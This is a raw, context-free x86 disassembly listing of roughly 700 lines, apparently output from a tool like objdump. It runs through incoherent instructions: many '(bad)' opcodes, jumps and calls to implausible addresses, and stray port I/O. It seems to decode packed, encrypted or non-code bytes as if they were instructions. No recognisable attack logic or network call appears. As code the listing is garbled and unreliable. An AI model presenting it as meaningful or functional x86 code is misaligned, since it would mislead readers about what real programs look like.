  40294a:	xor    DWORD PTR [ebx+0x3dde0003],edi
  402950:	sub    eax,DWORD PTR [ecx+0x31]
  402953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402954:	das    
  402955:	mov    esp,DWORD PTR [esi]
  402957:	inc    esi
  402958:	inc    edi
  402959:	or     BYTE PTR [edx+eax*2+0x5d],cl
  40295d:	(bad)  
  40295e:	inc    BYTE PTR [ecx+eax*2+0x6a167c04]
  402965:	add    BYTE PTR [ebp+edi*2-0xea6aff5],bh
  40296c:	sub    DWORD PTR [ecx+0x31],eax
  40296f:	pop    edx
  402970:	adc    ch,al
  402972:	je     0x4029c5
  402974:	(bad)  
  402976:	cmp    bh,bl
  402978:	push   edi
  402979:	add    eax,0xebdf78b8
  40297e:	sub    DWORD PTR [esi],edi
  402980:	lds    eax,FWORD PTR [edx+esi*4]
  402983:	adc    al,0xe6
  402985:	add    esp,DWORD PTR [edx+ebx*8]
  402988:	jb     0x4029d1
  40298a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40298b:	imul   esp,DWORD PTR [eax],0xb41435c2
  402991:	mov    BYTE PTR [ebp+0x39477265],al
  402997:	sbb    eax,0x942c5829
  40299c:	mov    cl,0x3
  40299e:	add    al,0x1e
  4029a0:	xor    DWORD PTR [ecx+esi*1],eax
  4029a3:	adc    al,0xe9
  4029a5:	cmp    BYTE PTR [eax],al
  4029a7:	add    BYTE PTR [eax-0x2a],bh
  4029aa:	in     eax,0x3
  4029ac:	fist   DWORD PTR [ebx]
  4029ae:	inc    ebx
  4029af:	add    al,0xcb
  4029b1:	adc    al,0x43
  4029b3:	add    al,0xcb
  4029b5:	adc    edx,DWORD PTR [ecx-0x7c]
  4029b8:	xor    DWORD PTR [ecx+ebp*8],edx
  4029bb:	fdivr  QWORD PTR [ebx+ebx*1+0x146ae4c1]
  4029c2:	jmp    0xa93d834f
  4029c7:	inc    eax
  4029c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029c9:	sbb    eax,0xdd0fec3a
  4029ce:	jmp    0xe95302d6
  4029d3:	add    esi,DWORD PTR [ecx]
  4029d5:	ins    DWORD PTR es:[edi],dx
  4029d6:	mov    al,0xc1
  4029d8:	xor    eax,0x15891414
  4029dd:	popf   
  4029de:	sub    al,0xc
  4029e0:	sub    dl,ah
  4029e2:	cmc    
  4029e3:	push   es
  4029e4:	mov    cl,0xb
  4029e6:	jmp    0xe9cc6241
  4029eb:	add    esi,DWORD PTR [ecx]
  4029ed:	adc    al,0x20
  4029ef:	shl    DWORD PTR ds:0x29564e14,0xbc
  4029f6:	cmp    ecx,eax
  4029f8:	xor    DWORD PTR [edx+ebp*2],edx
  4029fb:	fcmovnb st,st(6)
  4029fd:	aas    
  4029fe:	add    ah,ah
  402a00:	mov    esp,DWORD PTR [ebx]
  402a02:	add    cl,ch
  402a04:	xor    bl,BYTE PTR [ecx]
  402a06:	xchg   ebp,eax
  402a07:	sub    DWORD PTR ds:0x12c082,edi
  402a0d:	add    BYTE PTR [edi],ch
  402a0f:	mov    WORD PTR [eax],es
  402a11:	jmp    0x2c093e48
  402a16:	cs adc al,0x55
  402a19:	jb     0x4029b9
  402a1b:	xchg   esp,eax
  402a1c:	(bad)  
  402a1d:	std    
  402a1e:	sbb    DWORD PTR [edx+ebp*2],edx
  402a21:	jmp    0x1486883
  402a26:	imul   ebx,esp,0xd43fe900
  402a2c:	je     0x402a41
  402a2e:	sbb    eax,0x7f8ae864
  402a33:	enter  0x60ff,0xf0
  402a37:	(bad)  
  402a38:	pop    eax
  402a39:	sbb    DWORD PTR [edx+0x3e],ebp
  402a3c:	cld    
  402a3d:	mov    esi,0x79e81be0
  402a42:	outs   dx,BYTE PTR ds:[esi]
  402a43:	adc    eax,DWORD PTR [eax]
  402a45:	loop   0x402ab9
  402a47:	ds or  al,0xa6
  402a4a:	or     al,0xe8
  402a4d:	sbb    DWORD PTR [edi],eax
  402a4f:	enter  0xc2ff,0xf2
  402a53:	mov    ebx,0xc8706203
  402a58:	leave  
  402a59:	stos   DWORD PTR es:[edi],eax
  402a5a:	xor    DWORD PTR [edx*2-0x749be68e],edx
  402a61:	adc    al,0x29
  402a63:	cmp    dl,BYTE PTR [eax]
  402a65:	sbb    al,BYTE PTR ds:0xa66fa91
  402a6b:	cmp    eax,DWORD PTR [eax]
  402a6d:	shl    DWORD PTR [edx],cl
  402a6f:	cmp    al,BYTE PTR [ebx]
  402a71:	ret    
  402a72:	add    BYTE PTR [eax],al
  402a74:	xor    bh,BYTE PTR [edx]
  402a76:	add    eax,ecx
  402a78:	xor    dl,BYTE PTR [eax+eax*1]
  402a7b:	add    BYTE PTR [eax-0x15],bl
  402a7e:	jne    0x402a88
  402a80:	pusha  
  402a81:	test   edx,0x398c800
  402a87:	inc    eax
  402a88:	jl     0x402a89
  402a8a:	imul   eax,DWORD PTR [eax],0xcb6cbbe8
  402a90:	cwde   
  402a91:	adc    ecx,DWORD PTR [ecx+0x399443]
  402a97:	push   0xffffff88
  402a99:	cmp    DWORD PTR [eax],eax
  402a9b:	push   0xffffff9a
  402a9d:	cmp    DWORD PTR [eax],eax
  402a9f:	dec    ebx
  402aa1:	mov    ebx,0x1388cb5e
  402aa6:	or     eax,eax
  402aa8:	cld    
  402aa9:	stc    
  402aaa:	mov    BYTE PTR [ebx+0x5c],al
  402aad:	cmp    DWORD PTR [eax],eax
  402aaf:	push   0x58
  402ab1:	cmp    DWORD PTR [eax],eax
  402ab3:	push   0x4c
  402ab5:	add    ebp,eax
  402ab7:	dec    edi
  402ab8:	xchg   ebx,eax
  402ab9:	adc    eax,DWORD PTR [eax]
  402abb:	mov    DWORD PTR [ebx],ebx
  402abd:	sbb    BYTE PTR [ebx],cl
  402abf:	sar    ch,0xf3
  402ac2:	(bad)  
  402ac3:	jae    0x402b11
  402ac5:	mov    ebx,0x1348caf2
  402aca:	push   DWORD PTR [ebx]
  402acc:	shl    BYTE PTR [ebp-0x2de7ff36],0x3
  402ad3:	inc    edi
  402ad5:	jmp    0x4116d9
  402ada:	cmc    
  402adb:	jmp    0xd9151313
  402ae0:	add    BYTE PTR [eax],al
  402ae2:	iret   
  402ae3:	or     eax,0xea87ffff
  402ae8:	sub    eax,eax
  402aea:	ror    DWORD PTR [ebp+0x8],0xf
  402aee:	ins    DWORD PTR es:[edi],dx
  402aef:	rcr    DWORD PTR [ebx-0x37],cl
  402af2:	sbb    bl,BYTE PTR [ebx]
  402af4:	add    BYTE PTR [ebp+0x31],dl
  402af7:	xor    ah,bh
  402af9:	push   ebx
  402afa:	stos   BYTE PTR es:[edi],al
  402afb:	ja     0x402b08
  402afd:	or     DWORD PTR [edx],0x4e
  402b00:	dec    edi
  402b01:	pop    ss
  402b02:	(bad)  
  402b03:	mov    DWORD PTR [ebx],ecx
  402b05:	call   0x431d32
  402b0a:	mov    dh,0x89
  402b0c:	jmp    edi
  402b0e:	fadd   QWORD PTR [edx]
  402b10:	add    eax,DWORD PTR [eax]
  402b12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b13:	jmp    0xbcabd203
  402b18:	add    ebx,DWORD PTR [ebx+0x68]
  402b1b:	cli    
  402b1c:	(bad)  
  402b1d:	jmp    ebp
  402b1f:	inc    ecx
  402b20:	out    0x81,eax
  402b22:	ins    DWORD PTR es:[edi],dx
  402b23:	sbb    al,0xea
  402b25:	(bad)  
  402b26:	jle    0x402ace
  402b28:	xor    al,BYTE PTR [ebx+0x412b4034]
  402b2e:	xor    DWORD PTR [ebp+0x1f66154f],edi
  402b34:	dec    edi
  402b35:	sub    al,dh
  402b37:	mov    esp,0xd5588aeb
  402b3c:	fld    st(7)
  402b3e:	add    BYTE PTR [eax],al
  402b40:	xor    al,0x8
  402b42:	sub    al,0x41
  402b44:	xor    DWORD PTR [ebp+0x3a310003],edi
  402b4a:	pop    ss
  402b4b:	jns    0x402b56
  402b4d:	cld    
  402b4e:	add    eax,DWORD PTR [eax]
  402b50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b51:	enter  0x35d8,0xa8
  402b55:	jecxz  0x402b99
  402b57:	add    BYTE PTR [ecx],cl
  402b59:	adc    bl,bl
  402b5b:	call   DWORD PTR [esi]
  402b5d:	outs   dx,DWORD PTR ds:[esi]
  402b5e:	(bad)  
  402b5f:	js     0x402bba
  402b61:	cld    
  402b62:	add    eax,DWORD PTR [eax]
  402b64:	xor    DWORD PTR [ebx+0x4bb48d03],edi
  402b6a:	jmp    0xec6c226e
  402b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b70:	loope  0x402b86
  402b72:	fnstenvw [edi+ecx*4-0x3a2116b3]
  402b7a:	mov    ecx,0x4ec4bbeb
  402b7f:	fnstcw WORD PTR [edi+ecx*2+0x47593445]
  402b86:	adc    DWORD PTR [ebx+0x31],eax
  402b89:	cmp    al,0xeb
  402b8b:	add    esi,DWORD PTR [ecx]
  402b8d:	xchg   esp,eax
  402b8e:	inc    ecx
  402b8f:	jno    0x402c0b
  402b91:	adc    al,0xe9
  402b93:	or     al,0x71
  402b95:	adc    eax,0x14303d64
  402b9a:	jmp    0xff00d85f
  402b9f:	fmul   DWORD PTR [esi+0x3e914]
  402ba5:	add    BYTE PTR [ecx],dh
  402ba7:	int    0x64
  402ba9:	fmul   QWORD PTR [esi+0x26d8f6c5]
  402baf:	adc    al,0xe9
  402bb1:	ins    DWORD PTR es:[edi],dx
  402bb2:	xor    DWORD PTR [edx],edi
  402bb4:	jmp    0xe97a5d26
  402bb9:	xchg   BYTE PTR [esp+ecx*8+0x6456d8c6],dh
  402bc0:	pop    esp
  402bc1:	jle    0x402c10
  402bc3:	mov    ch,0xc6
  402bc5:	fsub   st,st(1)
  402bc7:	les    esi,FWORD PTR [edi+ecx*8+0x4e]
  402bcb:	lds    esi,FWORD PTR [esi-0x3e384328]
  402bd1:	ss cli 
  402bd3:	adc    ebp,ecx
  402bd5:	or     al,0xf1
  402bd7:	adc    al,0x64
  402bd9:	hlt    
  402bda:	xor    DWORD PTR [ecx+ebp*8],edx
  402bdd:	imul   esp,esp,0xfffffffb
  402be0:	daa    
  402be1:	add    al,0x99
  402be3:	inc    edi
  402be4:	rol    DWORD PTR [edx+0x31],1
  402be7:	mov    esp,0xc4fed7fe
  402bec:	add    dl,ah
  402bee:	repnz adc al,0x84
  402bf1:	js     0x402c25
  402bf3:	adc    al,0x0
  402bf5:	jb     0x402b99
  402bf7:	xchg   esi,eax
  402bf8:	test   DWORD PTR [ebp-0x37],ebx
  402bfb:	(bad)  
  402bfc:	(bad)  
  402bfd:	mov    ecx,0x4dbcbc1c
  402c02:	jmp    0x396937cb
  402c07:	nop
  402c08:	fucompp 
  402c0a:	add    BYTE PTR [eax],al
  402c0c:	xor    dl,BYTE PTR [ecx+ecx*4]
  402c0f:	ins    BYTE PTR es:[edi],dx
  402c10:	shl    BYTE PTR [edi+edi*8-0x177148d2],cl
  402c17:	push   ss
  402c18:	mov    esp,eax
  402c1a:	push   eax
  402c1b:	xchg   ecx,eax
  402c1c:	ret    
  402c1d:	sti    
  402c1e:	inc    eax
  402c1f:	jmp    0xff20aa9d
  402c24:	les    bp,DWORD PTR [eax-0x15]
  402c28:	xor    dl,BYTE PTR [eax+eax*4]
  402c2b:	adc    DWORD PTR [ecx+0x2af6ffc8],esp
  402c31:	aam    0xf
  402c33:	gs iret 
  402c35:	adc    eax,DWORD PTR [eax]
  402c37:	jmp    0xee41f7ef
  402c3c:	fsub   QWORD PTR [edi+0x6432e900]
  402c42:	call   DWORD PTR [ebp+ebx*2-0x239004c]
  402c49:	les    esi,FWORD PTR [ebp-0x3ba947]
  402c4f:	shl    DWORD PTR [edi+edi*4],0xff
  402c53:	scas   al,BYTE PTR es:[edi]
  402c54:	mov    eax,0xfe96e899
  402c59:	ret    
  402c5a:	push   eax
  402c5b:	adc    esp,esi
  402c5d:	in     al,dx
  402c5e:	inc    eax
  402c5f:	jmp    0x7f20b663
  402c64:	out    0xc3,al
  402c66:	push   0x181a00
  402c6b:	and    BYTE PTR [eax+0xfffb53],0x0
  402c72:	jg     0x402c83
  402c74:	shl    BYTE PTR [esp+edx*1-0x69],0xbd
  402c79:	call   0x24017fd
  402c7e:	push   es
  402c7f:	pop    ds
  402c80:	push   eax
  402c81:	push   eax
  402c82:	dec    ebp
  402c83:	xchg   ebp,eax
  402c84:	cld    
  402c85:	out    dx,eax
  402c86:	jg     0x402c73
  402c88:	push   eax
  402c89:	call   0x40fd0e
  402c8e:	cwde   
  402c8f:	mov    WORD PTR [ebp-0x149004],es
  402c95:	push   eax
  402c96:	pop    edi
  402c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c98:	in     al,dx
  402c99:	out    dx,eax
  402c9a:	dec    edi
  402c9b:	jmp    0x402c85
  402c9d:	iret   
  402c9e:	inc    esp
  402c9f:	jmp    0x402ca0
  402ca1:	pop    eax
  402ca2:	aas    
  402ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ca4:	call   0x512b6c98
  402ca9:	inc    DWORD PTR [ebp-0x54]
  402cac:	out    dx,eax
  402cad:	(bad)  
  402cae:	jg     0x402c5f
  402cb0:	mov    esp,0xe8ea7ff4
  402cb5:	sbb    DWORD PTR [eax-0x16],esp
  402cb8:	(bad)  
  402cb9:	jmp    0x402cf3
  402cbb:	lea    eax,[ebp-0x159004]
  402cc1:	push   eax
  402cc2:	jo     0x402cde
  402cc4:	leave  
  402cc5:	add    BYTE PTR [eax+0x57],bl
  402cc8:	push   eax
  402cc9:	(bad)  
  402cca:	aad    0xea
  402ccc:	out    dx,eax
  402ccd:	(bad)  
  402cce:	jg     0x402cd7
  402cd0:	push   DWORD PTR [ebp-0x4594]
  402cd6:	add    BYTE PTR [eax],al
  402cd8:	lock inc ebx
  402cda:	hlt    
  402cdb:	dec    edi
  402cdd:	scas   al,BYTE PTR es:[edi]
  402cde:	repnz idiv DWORD PTR [edi+0x31b5ffe9]
  402ce5:	(bad)  
  402ce6:	out    0xff,al
  402ce8:	push   cs
  402ce9:	xchg   ebp,eax
  402cea:	fdivrp st(7),st
  402cec:	push   es
  402ced:	call   0xffd6:0x920585d6
  402cf4:	or     BYTE PTR [edx],al
  402cf6:	aad    0xff
  402cf8:	out    dx,al
  402cf9:	xor    DWORD PTR [eax-0x4],edx
  402cfc:	fldcw  WORD PTR [edx]
  402cfe:	retf   0x3100
  402d01:	out    0x3,eax
  402d03:	call   FWORD PTR [esp+ebx*2+0x54ceffe6]
  402d0a:	xor    esi,esp
  402d0c:	(bad)  
  402d0d:	pop    ecx
  402d0e:	imul   eax,DWORD PTR [eax],0xefe747be
  402d14:	mov    dh,0x9
  402d16:	jmp    0x402d5b
  402d18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d19:	icebp  
  402d1a:	aad    0x8d
  402d1c:	lods   al,BYTE PTR ds:[esi]
  402d1d:	adc    dh,ah
  402d1f:	call   FWORD PTR [esi-0x5e4a2984]
  402d25:	sbb    esi,edx
  402d27:	call   FWORD PTR [ecx+0x3100cbfe]
  402d2d:	xor    bl,al
  402d2f:	js     0x402d1b
  402d31:	ror    DWORD PTR [edi-0x2a367910],0xe8
  402d38:	push   cs
  402d39:	ret    0xffd5
  402d3c:	add    BYTE PTR [eax],al
  402d3e:	mov    eax,0x5eefec2f
  402d43:	loope  0x402d1a
  402d45:	mov    ch,0x49
  402d47:	(bad)  
  402d49:	call   FWORD PTR [ecx+0x31]
  402d4c:	int    0xff
  402d4e:	inc    esi
  402d4f:	lea    ecx,[edi+0x28]
  402d52:	lock lods al,BYTE PTR ds:[esi]
  402d54:	aam    0xb5
  402d56:	dec    ebp
  402d57:	(bad)  
  402d59:	call   FWORD PTR [ecx]
  402d5b:	cs int3 
  402d5d:	add    BYTE PTR [ecx],dh
  402d5f:	adc    al,0xf2
  402d61:	ret    
  402d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d63:	sbb    eax,0xb2098772
  402d68:	xchg   esi,eax
  402d69:	aad    0xba
  402d6b:	les    esp,FWORD PTR [edx+0x17]
  402d6e:	jl     0x402d5c
  402d70:	daa    
  402d71:	add    al,0x2
  402d73:	jns    0x402df3
  402d75:	(bad)  
  402d76:	or     eax,0xd9d576b2
  402d7b:	sub    esp,DWORD PTR [ecx+0x6c8f3104]
  402d81:	loopne 0x402d51
  402d83:	rcr    DWORD PTR [esi+0x34],0xd6
  402d87:	xchg   DWORD PTR [ebp-0x1b],eax
  402d8a:	into   
  402d8b:	rol    DWORD PTR [ecx+0x53],0xf8
  402d8f:	adc    al,0xe9
  402d91:	jle    0x402d84
  402d93:	cmp    al,0xb2
  402d95:	aam    0x7c
  402d97:	mov    al,0x46
  402d99:	aad    0xae
  402d9b:	lods   al,BYTE PTR ds:[esi]
  402d9c:	das    
  402d9d:	out    0xa6,al
  402d9f:	shl    DWORD PTR [eax+0x7f],0x0
  402da3:	add    BYTE PTR [ecx-0x692ae14f],cl
  402da9:	xchg   DWORD PTR [ecx],eax
  402dab:	in     eax,0x8e
  402dad:	rol    DWORD PTR [ecx],0x16
  402db0:	jle    0x402d73
  402db2:	push   es
  402db3:	mov    eax,ds:0x3a7ebf8
  402db8:	jbe    0x402d41
  402dba:	or     eax,0x1c16ee5
  402dbf:	and    edi,DWORD PTR [ecx+0x14]
  402dc2:	jmp    0x2889ecf
  402dc7:	mov    DWORD PTR [esp+ebp*4-0x72b12b3a],esp
  402dce:	(bad)  [eax+0x43113b04]
  402dd4:	xor    ebp,eax
  402dd6:	test   esp,edx
  402dd8:	jl     0x402d92
  402dda:	add    dh,al
  402ddc:	add    eax,0xfae1e8c1
  402de1:	adc    eax,DWORD PTR [eax]
  402de3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402de4:	scas   eax,DWORD PTR es:[edi]
  402de5:	ret    
  402de6:	out    dx,eax
  402de7:	sahf   
  402de8:	std    
  402de9:	stos   DWORD PTR es:[edi],eax
  402dea:	pop    edx
  402deb:	xchg   ebp,esp
  402ded:	sar    bh,0x54
  402df0:	push   cs
  402df1:	mov    cl,0xff
  402df3:	xchg   BYTE PTR [edx],cl
  402df5:	push   ecx
  402df6:	out    dx,al
  402df7:	jle    0x402dd6
  402df9:	pusha  
  402dfa:	pop    esi
  402dfb:	mov    al,ds:0x7d8b66f1
  402e00:	pop    eax
  402e01:	or     al,0xe8
  402e03:	push   edx
  402e04:	in     al,dx
  402e05:	sar    bh,0x72
  402e08:	add    BYTE PTR [eax],al
  402e0a:	mov    ds:0x1a3a35c0,al
  402e0f:	push   ebx
  402e10:	add    BYTE PTR [esi+0x30],bl
  402e13:	shl    DWORD PTR [ebp-0xf],0xb5
  402e17:	push   ebp
  402e18:	add    al,0x70
  402e1a:	(bad)  
  402e1b:	in     eax,0x28
  402e1d:	test   al,0x32
  402e1f:	retf   
  402e20:	ret    0x32e5
  402e23:	mov    edx,DWORD PTR [di]
  402e26:	mov    cl,0xd7
  402e28:	clc    
  402e29:	mov    dh,0xd5
  402e2b:	push   esi
  402e2c:	clc    
  402e2d:	jmp    0x6a404264
  402e32:	fisttp WORD PTR [ebx]
  402e34:	add    BYTE PTR [ebp-0x80],bh
  402e37:	shl    DWORD PTR [ebp-0x13],0x5d
  402e3b:	inc    esi
  402e3c:	or     BYTE PTR [ebx-0xcf953ce],al
  402e42:	add    al,0x89
  402e45:	sub    al,0x81
  402e47:	lods   al,BYTE PTR ds:[esi]
  402e48:	pop    es
  402e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e4a:	call   0x33292f0e
  402e4f:	adc    al,0x8b
  402e51:	or     al,0x7e
  402e53:	jmp    0x402e95
  402e55:	add    BYTE PTR [eax-0x1f],cl
  402e58:	adc    ecx,DWORD PTR [ebx+0x473be40d]
  402e5e:	sbb    al,0x5d
  402e60:	or     edi,eax
  402e62:	dec    ebp
  402e63:	rol    BYTE PTR [ecx],1
  402e65:	add    BYTE PTR [eax],cl
  402e67:	adc    al,0xeb
  402e69:	push   es
  402e6a:	mov    ds:0xff0b23,eax
  402e6f:	add    BYTE PTR ds:0xa07d83e1,ch
  402e75:	sbb    BYTE PTR [ebp+0x8],dh
  402e78:	mov    bh,0x5d
  402e7a:	cld    
  402e7b:	call   0x40120a
  402e80:	push   ebx
  402e81:	dec    ebp
  402e82:	clc    
  402e83:	pop    edi
  402e84:	xchg   ecx,eax
  402e85:	(bad)  
  402e86:	or     BYTE PTR [eax],al
  402e88:	lahf   
  402e89:	ds cmp eax,0x5940d3
  402e8f:	jmp    0x402e61
  402e91:	cli    
  402e92:	mov    bh,BYTE PTR [edi]
  402e94:	jo     0x402ee1
  402e96:	idiv   bh
  402e98:	ja     0x402e59
  402e9a:	(bad)  
  402e9b:	jne    0x402e99
  402e9d:	retf   0xd305
  402ea0:	xor    BYTE PTR [ecx+0x0],bl
  402ea3:	add    BYTE PTR [eax+0x4b5f0013],bl
  402ea9:	std    
  402eaa:	mov    ch,ah
  402eac:	(bad)  
  402eae:	imul   eax,DWORD PTR [eax],0xe8085d27
  402eb4:	dec    edi
  402eb5:	sar    edi,1
  402eb7:	inc    DWORD PTR [ebx]
  402eb9:	sar    bh,1
  402ebb:	jne    0x402e3d
  402ebd:	(bad)  [edx]
  402ebf:	(bad)  
  402ec0:	pop    eax
  402ec1:	adc    eax,DWORD PTR [ebx+0xf5d59f8]
  402ec7:	push   edi
  402ec8:	enter  0x2221,0x75
  402ecc:	pusha  
  402ecd:	iret   
  402ece:	lea    esi,[edi+0x31]
  402ed1:	lods   al,BYTE PTR ds:[esi]
  402ed2:	jle    0x402e9c
  402ed4:	add    BYTE PTR [eax],al
  402ed6:	inc    edx
  402ed7:	cdq    
  402ed8:	xor    ch,BYTE PTR [eax-0xd]
  402edb:	and    eax,DWORD PTR [ebp+0x0]
  402ede:	fsubrp st(4),st
  402ee0:	outs   dx,BYTE PTR ds:[esi]
  402ee1:	enter  0xad31,0xfe
  402ee5:	mov    edi,0x40c9b99d
  402eea:	xor    eax,0x8b5c5dad
  402eef:	lods   eax,DWORD PTR ds:[esi]
  402ef0:	cmp    ch,al
  402ef2:	mov    esi,0x3a000374
  402ef7:	ins    DWORD PTR es:[edi],dx
  402ef8:	push   edi
  402ef9:	add    eax,0xeb03acf7
  402efe:	xor    dh,BYTE PTR [edi+0xa]
  402f01:	add    BYTE PTR [esi+0x31c6b295],al
  402f07:	lods   eax,DWORD PTR ds:[esi]
  402f08:	xchg   al,bh
  402f0a:	xor    bl,dh
  402f0c:	push   es
  402f0d:	(bad)  
  402f0e:	lods   eax,DWORD PTR cs:[esi]
  402f10:	jle    0x402ed9
  402f12:	outs   dx,DWORD PTR ds:[esi]
  402f13:	xchg   BYTE PTR [edx+eax*8-0x74c752d3],bh
  402f1a:	int    0x29
  402f1c:	(bad)  
  402f1d:	cld    
  402f1e:	stos   BYTE PTR es:[edi],al
  402f1f:	ja     0x402f20
  402f21:	add    al,0x31
  402f23:	fld    QWORD PTR [ebx]
  402f25:	add    BYTE PTR [ecx],al
  402f27:	push   ebp
  402f28:	shl    ebp,0x9e
  402f2b:	cmc    
  402f2c:	jnp    0x402f73
  402f2e:	xchg   ebp,eax
  402f2f:	sbb    eax,0x9f8e0c58
  402f34:	iret   
  402f35:	(bad)  
  402f36:	cld    
  402f37:	mov    ah,0xdb
  402f39:	hlt    
  402f3a:	add    BYTE PTR [eax],al
  402f3c:	test   BYTE PTR ds:0xdcfcffd2,dl
  402f42:	shl    BYTE PTR [ebp+0x3d],cl
  402f45:	(bad)  
  402f46:	push   edi
  402f47:	cld    
  402f48:	pop    ecx
  402f49:	xor    al,0x8
  402f4b:	add    BYTE PTR [ecx],dh
  402f4d:	adc    al,0xe6
  402f4f:	push   edi
  402f50:	push   ebp
  402f51:	stos   DWORD PTR es:[edi],eax
  402f52:	jns    0x402f2b
  402f54:	dec    esi
  402f55:	mov    esi,0x1435c6a0
  402f5a:	cmp    bl,BYTE PTR [esi+ebx*1-0x13]
  402f5e:	daa    
  402f5f:	add    al,0x49
  402f61:	loop   0x402f0a
  402f63:	add    al,0x31
  402f65:	or     DWORD PTR [ecx-0x6e76bca8],ebp
  402f6b:	pop    esp
  402f6c:	dec    edx
  402f6d:	jmp    0x402f96
  402f6f:	add    al,0x82
  402f71:	lods   al,BYTE PTR ds:[esi]
  402f72:	mov    cl,0xca
  402f74:	xor    DWORD PTR [edx+ecx*2],edx
  402f77:	adc    bl,BYTE PTR [eax+0x53]
  402f7a:	jmp    0x72a821ab
  402f7f:	loopne 0x402fe0
  402f81:	popa   
  402f82:	push   ss
  402f83:	shl    DWORD PTR [esp+ecx*1-0x7f],1
  402f87:	lahf   
  402f88:	out    dx,eax
  402f89:	adc    al,0xe9
  402f8b:	jae    0x402fb7
  402f8d:	aam    0xdc
  402f8f:	or     BYTE PTR [esi+0x59],dh
  402f92:	mov    edi,0xe90cf3ba
  402f97:	jl     0x402fdd
  402f99:	or     al,0x79
  402f9b:	jge    0x402f76
  402f9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f9e:	jb     0x402ff7
  402fa0:	add    BYTE PTR [eax],al
  402fa2:	and    eax,0xe8d028e9
  402fa7:	mov    ebp,0xa4a6d136
  402fac:	cmp    esp,DWORD PTR [edx+0x3e694c1]
  402fb2:	sbb    eax,0x9934b61b
  402fb7:	xchg   edi,eax
  402fb8:	das    
  402fb9:	add    al,0x31
  402fbb:	or     DWORD PTR [ecx],ebp
  402fbd:	push   edi
  402fbe:	ss pop ebp
  402fc0:	mov    ds:0xf1d26831,al
  402fc5:	add    edi,DWORD PTR [eax+0x7b6a0016]
  402fcb:	sbb    bl,ch
  402fcd:	pop    ss
  402fce:	lods   eax,DWORD PTR ds:[esi]
  402fcf:	adc    eax,DWORD PTR [eax]
  402fd1:	jmp    0x3f9b8d08
  402fd6:	mov    dl,dl
  402fd8:	or     cl,ch
  402fda:	dec    DWORD PTR [eax+0xbf762ec]
  402fe0:	or     ebp,DWORD PTR [ecx+0x18016de]
  402fe6:	xor    eax,0x32710947
  402feb:	adc    al,0x0
  402fed:	jmp    0xe94501cd
  402ff2:	xor    eax,0xb2f6ebe2
  402ff7:	sti    
  402ff8:	pop    ebx
  402ff9:	sbb    eax,0xbe38942e
  402ffe:	addr16 adc eax,0x1432e8ba
  403004:	add    BYTE PTR [edx+0x7a370000],dl
  40300a:	add    cl,ch
  40300c:	xor    dl,BYTE PTR [eax+eax*2]
  40300f:	imul   ebp,DWORD PTR [edx],0x554d7514
  403015:	ror    cl,cl
  403017:	sub    esi,DWORD PTR [esi]
  403019:	adc    al,0x55
  40301b:	(bad)  
  40301c:	out    0x64,al
  40301e:	push   esi
  40301f:	mov    edx,0xec0c573d
  403024:	xor    bl,BYTE PTR [eax]
  403026:	add    cl,ch
  403028:	jecxz  0x402fdd
  40302a:	push   eax
  40302b:	inc    ecx
  40302c:	fadd   st(7),st
  40302e:	jmp    FWORD PTR [esi]
  403030:	sbb    eax,0x15418bbc
  403035:	inc    edi
  403036:	or     BYTE PTR [edx+0x4f],dh
  403039:	adc    bl,ch
  40303b:	jmp    0x40300b
  40303d:	dec    edx
  40303e:	or     esp,DWORD PTR [eax]
  403040:	out    0x16,al
  403042:	add    BYTE PTR [eax],0x6e
  403045:	mov    esi,0x7963f574
  40304a:	je     0x40304e
  40304c:	hlt    
  40304d:	stc    
  40304e:	sub    al,al
  403050:	repnz xchg ebp,eax
  403052:	leave  
  403053:	jne    0x4030bb
  403055:	cmp    bl,al
  403057:	pop    ebx
  403058:	push   cs
  403059:	in     eax,dx
  40305a:	enter  0x50c2,0x10
  40305e:	push   ebx
  40305f:	push   esi
  403060:	mov    eax,ds:0x4800000b
  403065:	inc    eax
  403066:	xor    edx,edx
  403068:	mov    BYTE PTR [edi],ah
  40306a:	fist   DWORD PTR [eax+0x40ac0000]
  403070:	movzx  ecx,al
  403073:	inc    eax
  403074:	cmp    al,0x2b
  403076:	cwde   
  403077:	pop    ebp
  403078:	push   es
  403079:	nop
  40307a:	fwait
  40307b:	(bad)  
  40307c:	ds nop
  40307e:	pop    ebx
  40307f:	and    al,0x2f
  403081:	nop
  403082:	and    eax,0xca839012
  403087:	or     edx,DWORD PTR [eax-0x6fd853bd]
  40308d:	jl     0x403061
  40308f:	or     edi,DWORD PTR [ecx]
  403091:	nop
  403092:	iret   
  403093:	or     al,0x4
  403095:	add    al,0xcb
  403097:	xchg   DWORD PTR [ebx+0x3c],eax
  40309a:	cdq    
  40309b:	inc    edi
  40309c:	jl     0x4030a9
  40309e:	sbb    al,0xee
  4030a0:	(bad)  
  4030a1:	jg     0x403079
  4030a3:	sbb    eax,DWORD PTR [ecx-0x70]
  4030a6:	retf   
  4030a7:	xchg   DWORD PTR [ebx+0x3c],eax
  4030aa:	jns    0x4030f3
  4030ac:	jl     0x4030b8
  4030ae:	pushf  
  4030af:	dec    ebp
  4030b0:	nop
  4030b1:	jg     0x403048
  4030b3:	sbb    eax,DWORD PTR [edi+0x3]
  4030b6:	pop    eax
  4030b7:	push   edi
  4030b8:	rol    edx,0x96
  4030bb:	mov    ch,0xb1
  4030bd:	shl    DWORD PTR [ecx],0xf7
  4030c0:	add    eax,0xbbda738b
  4030c5:	ror    DWORD PTR [ecx-0x456fc53b],0x6
  4030cc:	je     0x40312c
  4030ce:	or     ch,dh
  4030d0:	cmp    BYTE PTR [ebx-0x61b30000],cl
  4030d6:	ss push esi
  4030d8:	push   ebp
  4030d9:	inc    esi
  4030da:	pop    eax
  4030db:	or     BYTE PTR [ecx-0x5eefafba],ah
  4030e1:	ss inc eax
  4030e3:	or     al,0xa1
  4030e5:	push   ds
